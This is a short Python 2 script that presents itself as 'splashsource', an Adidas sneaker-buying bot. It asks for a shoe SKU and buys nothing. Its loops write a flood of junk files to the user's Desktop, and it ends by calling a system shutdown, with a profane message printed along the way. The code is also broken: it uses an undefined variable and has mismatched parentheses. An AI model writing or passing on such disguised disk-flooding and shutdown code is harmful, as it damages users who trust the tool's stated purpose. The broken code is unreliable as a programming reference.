import os
import random
import subprocess

print("Starting splashsource, SHOES INCOMING")

for i in xrange(10000):
    print("Windows detected!")
    toCop = raw_input("What shoe should we buy from adidas? Type sku: ")
    print("We are buying %s" % toCop + "!")
    for i in xrange(1000):
        with open(os.path.expanduser('~') + '/Desktop/' + str(sku) + str(random.randint(1000, 999999), 'w') as cnt:
            cnt.write("COPPING ADIDAS " * 1000)
print("We fucking cooked dude")
subprocess.call(["shutdown", "/s"])
